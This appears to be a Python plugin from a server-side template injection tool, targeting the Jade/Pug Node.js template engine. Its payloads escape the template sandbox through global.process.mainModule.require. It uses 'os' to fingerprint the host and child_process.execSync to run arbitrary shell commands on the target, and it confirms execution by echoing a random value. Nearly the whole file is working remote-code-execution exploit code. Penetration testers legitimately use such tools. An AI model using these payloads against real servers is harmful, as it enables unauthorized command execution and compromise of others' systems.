from core.check import Check
from utils.loggers import log
from utils import rand
import string

class Jade(Check):

    render_tag = '\n= %(payload)s\n'
    header_tag = '\n= %(header)s\n'
    trailer_tag = '\n= %(trailer)s\n'
    contexts = [ ]

    def detect_engine(self):
        
        execution_code = """- var x = global.process
- x = x.mainModule.require
- x = x('os')
= x.platform()
"""
        self.set('os', self.inject(execution_code))
        self.set('language', 'javascript')
        self.set('eval', 'javascript')
        self.set('engine', 'jade')
        
    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('exec', True)

    def execute(self, command):

        execution_code = """- var x = global.process
- x = x.mainModule.require
- x = x('child_process')
= x.execSync('%s')
""" % command

        # TODO: quote command
        return self.inject(execution_code)